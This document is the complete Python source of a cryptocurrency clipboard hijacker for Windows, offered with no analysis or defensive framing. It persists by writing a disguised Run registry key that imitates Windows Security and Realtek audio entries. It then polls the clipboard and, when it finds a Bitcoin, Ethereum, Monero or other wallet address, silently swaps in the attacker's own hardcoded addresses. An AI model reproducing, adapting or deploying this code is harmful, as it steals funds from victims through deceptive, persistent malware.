import pyperclip
import time
import re
from sys import executable
from urllib import request
from os import getenv, system, name, listdir
from os.path import isfile
import winreg
from random import choice


def getPath():
    path = choice([getenv("APPDATA"), getenv("LOCALAPPDATA")])
    directory = listdir(path)
    for _ in range(10):
        chosen = choice(directory)
        ye = path + "\\" + chosen
        if not isfile(ye) and " " not in chosen:
            return ye
    return getenv("TEMP")

def getName():
    firstName = ''.join(choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))
    lasName = ['.dll', '.png', '.jpg', '.gay', '.ink', '.url', '.jar', '.tmp', '.db', '.cfg']
    return firstName + choice(lasName)

def startUP(path):
    faked = 'SecurityHealthSystray.exe'
    address = f"{executable} {path}"
    key1 = winreg.HKEY_CURRENT_USER
    key2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
    open_ = winreg.CreateKeyEx(key1, key2, 0, winreg.KEY_WRITE)
    winreg.SetValueEx(open_, "Realtek HD Audio Universal Service", 0, winreg.REG_SZ, f"{faked} & {address}")
 
def check(clipboard):
    regex = {
        "ada": "^D[A-NP-Za-km-z1-9]{35,}$",
        "lite": "^[LM3][a-km-zA-HJ-NP-Z1-9]{25,34}$",
        "tron": "^T[a-zA-Z0-9]{33}$",
        "btc": "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$",
        "xrp": "^r[0-9a-zA-Z]{24,34}$",
        "doge": "^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$",
        "xmr": "4[0-9AB][123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{93}",
        "dash": "^X[1-9A-HJ-NP-Za-km-z]{33}$",
        "eth": "^0x[a-fA-F0-9]{40}$",
    }
    for key, value in regex.items():
        if bool(re.search(value, clipboard)):
            return key
    return 0

def replace_crypto(data):
    my_addresses = {
                    "lite": "LaeRQNe74XWNkxWkmmCVU5JTJibcFQp9nG",
                    "tron": "TBfkK1Q5bgATK37bTopLCuLDvQCfur5KRG",
                    "btc": "bc1qw85f3s32fk2taesw57c0f9q8ejn274zst2myk0",
                    "xrp": "r9192DFY23rqz38bJZ61ntf6f24ZpgySCs",
                    "doge": "DPDi55FUGz1HNixNDS8zhgAPULithcSxqL",
                    "xmr": "42bVRjtggLhj5jSvELr1XRBesWfcHD2j5CqUr4scYGSPct3xnRGDswj91fkkSxxeqjYq4vsxt95hJU924RCjPf2VBuuYepc",
                    "eth": "0xA57e0706738EccD57F23e22B923206e2667DfC8d",
                    "ada": "addr1qyfc5nzwsywg5csc42lx3q7k8k740kg2jukyt9l4l4q6ftgn3fxyaqgu3f3p3247dzpav0da2lvs49evgktltl2p5jksagydks",
                    "dash": "XtvULcdrex6o72WrN5HcxK7AUuhff9MZw5",
                    }
    if data != 0 and my_addresses[data] != "null":
        pyperclip.copy(my_addresses[data])
    return 0

def main():
    while 1:
        time.sleep(0.7)
        clipboard = pyperclip.paste()
        data = check(clipboard)
        replace_crypto(data)

DoYouKnowTheWay = getPath() + '\\' + getName()
if __name__ == "__main__":
    startUP(DoYouKnowTheWay)
    main()
